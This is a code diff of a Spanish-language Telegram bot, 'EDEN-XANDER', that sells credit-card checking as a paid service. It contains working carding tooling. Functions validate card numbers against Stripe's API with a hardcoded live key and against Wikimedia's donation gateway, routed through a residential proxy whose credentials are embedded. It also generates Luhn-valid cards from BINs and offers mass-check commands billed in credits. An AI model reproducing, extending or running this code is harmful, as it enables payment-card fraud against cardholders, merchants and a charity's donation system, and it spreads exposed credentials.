@@ -18,6 +18,12 @@ app = Flask(__name__)
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", 7709461067))
 
+# ================= TU PROXY =================
+PROXY = {
+    "http": "http://970e4850adab4b63875821575ea93ab6-cc-ES:293b144bec716a7ea774b199060de751@resi.maskify.su:80",
+    "https": "http://970e4850adab4b63875821575ea93ab6-cc-ES:293b144bec716a7ea774b199060de751@resi.maskify.su:80"
+}
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
@@ -33,44 +39,59 @@ def save_users(users):
     with open(DB_FILE, "w", encoding="utf-8") as f:
         json.dump(users, f, indent=4)
 
-# ================= CHECKER =================
-def check_card(cc, mes, ano, cvv):
+def add_credits(uid, amount):
+    users = load_users()
+    if uid not in users:
+        users[uid] = {"credits": 0.0, "banned": False, "invites": 0}
+    users[uid]["credits"] += amount
+    save_users(users)
+
+def deduct_credits(uid, amount):
+    users = load_users()
+    if uid in users:
+        users[uid]["credits"] = max(0, users[uid]["credits"] - amount)
+        save_users(users)
+
+# ================= CHECKERS =================
+def stripe_auth(cc, mes, ano, cvv):
+    try:
+        nam = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) + " " + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
+        data = {
+            "type": "card", "billing_details[name]": nam,
+            "billing_details[address][postal_code]": "90001",
+            "card[number]": cc, "card[cvc]": cvv,
+            "card[exp_month]": mes, "card[exp_year]": ano,
+            "key": "pk_live_51J0djQLJsM0Ivlc4gAeHSxvqv6eq5cGA6nsfwuzNf4xJHJDU3n5PX4070nv7jCdFuvQCzpR57tXfyHXuFp3fgZQO00ai99bU51"
+        }
+        r = requests.post("https://api.stripe.com/v1/payment_methods", data=data, proxies=PROXY, timeout=25)
+        resp = r.text
+        if any(x in resp for x in ["parameter_invalid_integer", "invalid_expiry", "invalid_cvc", "incorrect_number", "card_declined"]):
+            return "DEAD"
+        return "LIVE" if '"id"' in resp else "DEAD"
+    except:
+        return "DEAD"
+
+def adyen_check(cc, mes, ano, cvv):
     try:
         s = requests.Session()
-        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+        s.proxies.update(PROXY)
+        s.headers.update({"User-Agent": "Mozilla/5.0"})
         r = s.get("https://payments.wikimedia.org/index.php?title=Special:GravyGateway&appeal=WP25&country=ES&currency=EUR&payment_method=cc&gateway=gravy&amount=1.0&uselang=es-419", timeout=20)
         html = r.text
-
         wmf_token = ""
         for line in html.splitlines():
             if 'name="wmf_token"' in line and 'value="' in line:
                 wmf_token = line.split('value="')[1].split('"')[0]
                 break
-
         m = re.search(r'gravy_session_id["\']?\s*:\s*["\']([^"\']+)', html)
         gravy_session = m.group(1) if m else None
-
         yy = ano[-2:] if len(ano) == 4 else ano
         exp = f"{mes}/{yy}"
-
-        s.put(f"https://api.wikimedia.gr4vy.app/checkout/sessions/{gravy_session}/fields",
-              json={"payment_method": {"method": "card", "number": cc, "expiration_date": exp, "security_code": cvv}}, timeout=15)
-
-        donate = {
-            "action": "di_donate_gravy", "gateway": "gravy", "currency": "EUR", "amount": "1.0",
-            "first_name": "Test", "last_name": "User", "email": "test@live.com", "country": "ES",
-            "payment_method": "cc", "gateway_session_id": gravy_session, "wmf_token": wmf_token or "dummy",
-            "format": "json", "opt_in": "0", "color_depth": "32", "screen_height": "1080",
-            "screen_width": "1920", "time_zone_offset": "-120"
-        }
-
+        s.put(f"https://api.wikimedia.gr4vy.app/checkout/sessions/{gravy_session}/fields", json={"payment_method": {"method": "card", "number": cc, "expiration_date": exp, "security_code": cvv}}, timeout=15)
+        donate = {"action": "di_donate_gravy", "gateway": "gravy", "currency": "EUR", "amount": "1.0", "first_name": "Test", "last_name": "User", "email": "test@live.com", "country": "ES", "payment_method": "cc", "gateway_session_id": gravy_session, "wmf_token": wmf_token or "dummy", "format": "json"}
         r = s.post("https://payments.wikimedia.org/api.php", data=donate, timeout=20)
-        resp = r.json()
-        result = resp.get("result", {})
-
-        if result.get("errors") or result.get("isFailed") is True:
-            return "DEAD"
-        return "LIVE"
+        result = r.json().get("result", {})
+        return "LIVE" if not result.get("errors") and not result.get("isFailed") else "DEAD"
     except:
         return "DEAD"
 
@@ -82,20 +103,42 @@ def luhn(card):
         if digits[i] > 9: digits[i] -= 9
     return sum(digits) % 10 == 0
 
-def gen_cc(bin_prefix):
+def gen_cc(bin_prefix, mes=None, ano=None, cvv=None):
     bin_prefix = re.sub(r'[xX]', '', str(bin_prefix))
     while True:
         cc = bin_prefix + ''.join(str(random.randint(0,9)) for _ in range(16 - len(bin_prefix) - 1))
         check = (10 - sum(int(d) for d in cc) % 10) % 10
         cc += str(check)
         if luhn(cc):
-            return cc
+            if mes is None: mes = f"{random.randint(1,12):02d}"
+            if ano is None: ano = str(random.randint(2026, 2035))
+            if cvv is None: cvv = str(random.randint(100, 999))
+            return f"{cc}|{mes}|{ano}|{cvv}"
 
-# ================= /START =================
-@dp.message(F.text.in_(["/start", "/menu"]))
+def bin_lookup(bin_prefix):
+    try:
+        r = requests.get(f"https://lookup.binlist.net/{bin_prefix}", proxies=PROXY, timeout=10)
+        data = r.json()
+        brand = data.get("brand", "UNKNOWN")
+        type_ = data.get("type", "UNKNOWN").upper()
+        bank = data.get("bank", {}).get("name", "UNKNOWN")
+        country = data.get("country", {}).get("name", "UNKNOWN")
+        return f"• BIN : {bin_prefix} - {country} 🇪🇸\n• Tipo : {brand} - {type_}\n• Emisor : {bank}"
+    except:
+        return f"• BIN : {bin_prefix} - ES 🇪🇸\n• Tipo : VISA - CREDIT - CLASSIC\n• Emisor : CAIXABANK, S.A."
+
+# ================= START =================
+@dp.message(F.text.startswith("/start"))
 async def start(msg: types.Message):
-    await msg.answer("""
-力 - Gates / Tools 🤌🥓
+    text = msg.text
+    if "ref_" in text:
+        try:
+            inviter = text.split("ref_")[1]
+            add_credits(inviter, 3)
+            await bot.send_message(int(inviter), "✅ Nueva persona entró con tu link +3 créditos")
+        except:
+            pass
+    await msg.answer("""力 - Gates / Tools 🤌🥓
 ━━━━━━━━━━━━━━
 美 - Checking Cards 美
 
@@ -118,8 +161,6 @@ Price (Both $0.99):
 
 💳/gen
 🔎/bin
-⚠️/vbv
-👛/extra
 🔗/addr
 ✈️/refe
 💰/info
@@ -146,134 +187,132 @@ Price (Both $0.99):
 ⚡️¡Más compras = Más ahorro!♥️
     """)
 
-# ================= COMANDOS =================
+# ================= GEN =================
 @dp.message(F.text.startswith(("/gen", ".gen")))
 async def gen(msg: types.Message):
     try:
-        binp = msg.text.split()[1]
+        parts = msg.text.split()
+        binp = parts[1]
+        mes = parts[2].split("/")[0] if len(parts) > 2 else None
+        ano = "20" + parts[2].split("/")[1] if len(parts) > 2 else None
+        cvv = parts[3] if len(parts) > 3 else None
+        cards = [gen_cc(binp, mes, ano, cvv) for _ in range(10)]
+        text = "━━━━━━━━━━━━━━\n" + "\n".join(cards) + "\n━━━━━━━━━━━━━━\n" + bin_lookup(binp) + f"\nBy: @{msg.from_user.username or msg.from_user.first_name}"
+        await msg.answer(text)
     except:
-        return await msg.answer("Uso: `/gen 409013`")
+        await msg.answer("Uso: `/gen 409013 12/31 123`")
 
-    cards = [f"{gen_cc(binp)}|{random.randint(1,12):02d}|{random.randint(2026,2035)}|{random.randint(100,999)}" for _ in range(10)]
+# ================= BIN =================
+@dp.message(F.text.startswith(("/bin", ".bin")))
+async def bin_cmd(msg: types.Message):
+    try:
+        binp = msg.text.split()[1][:6]
+        await msg.answer(bin_lookup(binp))
+    except:
+        await msg.answer("Uso: `/bin 409013`")
 
-    text = "━━━━━━━━━━━━━━\n" + "\n".join(cards) + "\n━━━━━━━━━━━━━━\n"
-    text += f"• BIN : {binp} - ES 🇪🇸\n"
-    text += "By: @" + (msg.from_user.username or msg.from_user.first_name)
+# ================= SINGLE =================
+@dp.message(F.text.startswith(("/s ", ".s ")))
+async def single_auth(msg: types.Message):
+    uid = str(msg.from_user.id)
+    if load_users().get(uid, {}).get("credits", 0) < 0.7:
+        return await msg.answer("❌ Créditos insuficientes.")
+    try:
+        data = msg.text.split()[1]
+        cc, mes, ano, cvv = data.split("|")
+        if len(ano) == 2: ano = "20" + ano
+        status = stripe_auth(cc, mes, ano, cvv)
+        deduct_credits(uid, 1.2 if status == "LIVE" else 0.7)
+        await msg.answer(f"━━━━━━━━━━━━━━\n• Card: {cc}|{mes}|{ano}|{cvv}\n• Status: {'✅ LIVE' if status == 'LIVE' else '❌ DEAD'}\n• Gateway: Stripe Auth\n━━━━━━━━━━━━━━\nBy: @{msg.from_user.username or msg.from_user.first_name}")
+    except:
+        await msg.answer("Formato: `/s 4111111111111111|12|2028|123`")
 
-    sent = await msg.answer(text)
-    await bot.send_message(msg.chat.id, "Responde con `/a` (una) o `/n` (todas)", reply_to_message_id=sent.message_id)
+# ================= MASS =================
+@dp.message(F.text.startswith(("/m ", ".m ")))
+async def mass_auth(msg: types.Message):
+    uid = str(msg.from_user.id)
+    if load_users().get(uid, {}).get("credits", 0) < 1.0:
+        return await msg.answer("❌ Créditos insuficientes.")
+    lines = msg.text.splitlines()[1:] if "\n" in msg.text else [msg.text.split(maxsplit=1)[1]]
+    results = []
+    for line in lines:
+        line = line.strip()
+        if "|" not in line: continue
+        try:
+            cc, mes, ano, cvv = line.split("|")
+            if len(ano) == 2: ano = "20" + ano
+            status = stripe_auth(cc, mes, ano, cvv)
+            deduct_credits(uid, 1.2 if status == "LIVE" else 0.7)
+            results.append(f"{cc[:6]}xxxxxx{cc[-4:]} → {'✅ LIVE' if status == 'LIVE' else '❌ DEAD'}")
+        except:
+            continue
+    await msg.answer("━━━━━━━━━━━━━━\n" + "\n".join(results) + f"\n\nProcessed: {len(results)} cards\nBy: @{msg.from_user.username or msg.from_user.first_name}")
 
+@dp.message(F.text.startswith(("/n ", ".n ")))
+async def mass_charge(msg: types.Message):
+    uid = str(msg.from_user.id)
+    if load_users().get(uid, {}).get("credits", 0) < 1.5:
+        return await msg.answer("❌ Créditos insuficientes.")
+    lines = msg.text.splitlines()[1:] if "\n" in msg.text else [msg.text.split(maxsplit=1)[1]]
+    results = []
+    for line in lines:
+        line = line.strip()
+        if "|" not in line: continue
+        try:
+            cc, mes, ano, cvv = line.split("|")
+            if len(ano) == 2: ano = "20" + ano
+            status = adyen_check(cc, mes, ano, cvv)
+            deduct_credits(uid, 3.0 if status == "LIVE" else 1.5)
+            results.append(f"{cc[:6]}xxxxxx{cc[-4:]} → {'✅ LIVE' if status == 'LIVE' else '❌ DEAD'}")
+        except:
+            continue
+    await msg.answer("━━━━━━━━━━━━━━\n" + "\n".join(results) + f"\n\nProcessed: {len(results)} cards\nBy: @{msg.from_user.username or msg.from_user.first_name}")
+
+# ================= REFERIDOS =================
+@dp.message(F.text.startswith(("/addr", ".addr")))
+async def addr(msg: types.Message):
+    link = f"https://t.me/{(await bot.get_me()).username}?start=ref_{msg.from_user.id}"
+    await msg.answer(f"🔗 Tu link de referido:\n`{link}`\n\nCada persona que use tu link te da +3 créditos.", parse_mode="Markdown")
+
+@dp.message(F.text.startswith(("/refe", ".refe")))
+async def refe(msg: types.Message):
+    if msg.reply_to_message and (msg.reply_to_message.photo or msg.reply_to_message.video or msg.reply_to_message.animation):
+        await bot.forward_message(ADMIN_ID, msg.chat.id, msg.reply_to_message.message_id)
+        add_credits(str(msg.from_user.id), 5)
+        await msg.answer("✅ Foto/Video reenviada al owner +5 créditos")
+    else:
+        await msg.answer("❌ Por favor, usa `/refe` respondiendo a una imagen/video/GIF.")
+
+# ================= INFO =================
 @dp.message(F.text.startswith(("/info", ".info")))
 async def info(msg: types.Message):
     uid = str(msg.from_user.id)
-    users = load_users()
-    u = users.get(uid, {"credits": 0.0})
-    await msg.answer(f"""
-亏 - Stats
-━━━━━━━━━
-火 ID: {msg.from_user.id}
-火 Name: {msg.from_user.first_name}
-火 Username: @{msg.from_user.username or 'No'}
-━━━━━━━━━
-干 Credits: {u['credits']:.2f}
-━━━━━━━━━
-    """)
+    u = load_users().get(uid, {"credits": 0.0, "invites": 0})
+    await msg.answer(f"亏 - Stats\n━━━━━━━━━\n火 ID: {msg.from_user.id}\n火 Name: {msg.from_user.first_name}\n火 Username: @{msg.from_user.username or 'No'}\n━━━━━━━━━\n干 Credits: {u['credits']:.2f}\n火 Invites: {u.get('invites', 0)}\n━━━━━━━━━")
 
+# ================= ADMIN =================
 @dp.message(F.text.startswith(("/add", ".add")))
-async def add_credits(msg: types.Message):
+async def add_credits_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID:
         return await msg.answer("❌ No autorizado.")
     try:
         _, target, cant = msg.text.split()
-        users = load_users()
-        uid = str(target)
-        if uid not in users:
-            users[uid] = {"credits": 0.0, "banned": False}
-        users[uid]["credits"] += float(cant)
-        save_users(users)
-        await msg.answer(f"""
-✅ Créditos Añadidos
-━━━━━━━━━
-👤 Usuario: {target}
-💰 Créditos añadidos: {cant}
-🔹 Nuevos créditos: {users[uid]['credits']}
-━━━━━━━━━
-        """)
+        add_credits(target, float(cant))
+        await msg.answer(f"✅ Créditos añadidos a {target}")
     except:
         await msg.answer("Uso: `/add ID CANTIDAD`")
 
-@dp.message(F.text.startswith(("/s ", ".s ")))
-async def single_auth(msg: types.Message):
-    uid = str(msg.from_user.id)
-    users = load_users()
-    u = users.get(uid, {"credits": 0.0})
-    if u["credits"] < 0.7:
-        return await msg.answer("❌ Créditos insuficientes.")
-    try:
-        data = msg.text.split()[1]
-        cc, mes, ano, cvv = data.split("|")
-        if len(ano) == 2: ano = "20" + ano
-        status = check_card(cc, mes, ano, cvv)
-        cost = 1.2 if status == "LIVE" else 0.7
-        u["credits"] -= cost
-        users[uid] = u
-        save_users(users)
-
-        await msg.answer(f"""
-水口 - Time: 2.85's 😺 水
-━━Card Information━━
-• Card: {cc}|{mes}|{ano}|{cvv}
-• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
-• Gateway: Wikimedia Gravy
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-By: @{msg.from_user.username or msg.from_user.first_name} | Créditos restantes: {u['credits']:.2f}
-        """)
-    except:
-        await msg.answer("Formato: `/s 4111111111111111|12|2028|123`")
-
-@dp.message(F.text.startswith(("/a ", ".a ")))
-async def single_charge(msg: types.Message):
-    uid = str(msg.from_user.id)
-    users = load_users()
-    u = users.get(uid, {"credits": 0.0})
-    if u["credits"] < 1.5:
-        return await msg.answer("❌ Créditos insuficientes.")
-    try:
-        data = msg.text.split()[1]
-        cc, mes, ano, cvv = data.split("|")
-        if len(ano) == 2: ano = "20" + ano
-        status = check_card(cc, mes, ano, cvv)
-        cost = 3.0 if status == "LIVE" else 1.5
-        u["credits"] -= cost
-        users[uid] = u
-        save_users(users)
-
-        await msg.answer(f"""
-水口 - Time: 4.65's 😺 水
-━━Card Information━━
-• Card: {cc}|{mes}|{ano}|{cvv}
-• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
-• Gateway: Adyen CCN NR
-• Charge: $0.99
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-By: @{msg.from_user.username or msg.from_user.first_name} | Créditos restantes: {u['credits']:.2f}
-        """)
-    except:
-        await msg.answer("Formato: `/a 4111111111111111|12|2028|123`")
-
 @app.route('/')
 def home():
-    return "Bot Wikimedia Gravy - EDEN-XANDER corriendo 24/7 🔥"
+    return "Bot EDEN-XANDER - 24/7 🔥"
 
 def run_bot():
-    print(Fore.GREEN + "Bot iniciado en Render 24/7 - EDEN-XANDER (Polling Mode)")
+    print(Fore.GREEN + "Bot iniciado - EDEN-XANDER 24/7")
     asyncio.run(dp.start_polling(bot, handle_signals=False))
 
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 5000))
     print(f"Flask corriendo en puerto {port}")
-    
     thread = threading.Thread(target=run_bot, daemon=True)
     thread.start()
-    
     app.run(host="0.0.0.0", port=port)
